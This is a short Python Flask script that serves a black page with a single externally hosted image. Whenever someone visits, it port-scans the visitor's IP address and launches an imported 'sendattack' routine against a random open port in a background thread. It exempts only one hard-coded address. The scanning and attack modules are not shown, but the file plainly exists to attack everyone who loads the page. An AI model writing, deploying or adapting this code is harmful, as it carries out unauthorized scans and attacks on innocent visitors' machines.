import random
from threading import Thread
from portsweeper import sweep
from attacker import sendattack
from flask import Flask, request

app = Flask(__name__)


@app.route('/')
def index():
    ip = ''
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip = request.environ['REMOTE_ADDR']
    else:
        ip = request.environ['HTTP_X_FORWARDED_FOR']
    ports = sweep(ip)
    r = random.choice(ports)
    if ip != '91.90.124.10':
        Thread(target=sendattack, args=(
            ip,
            int(r),
        )).start()
    else:
      print(ip)
    return '''<html>
  <head>
    <style>
      body {
        background-color: black;
        color: white;
      }
    </style>
  </head>
  <body>
    <img src="https://cdn-128.anonfiles.com/Z3QfJ62dy1/324bb682-1659927671/cjng.png">
  </body>
<html>'''


app.run('0.0.0.0', 443)
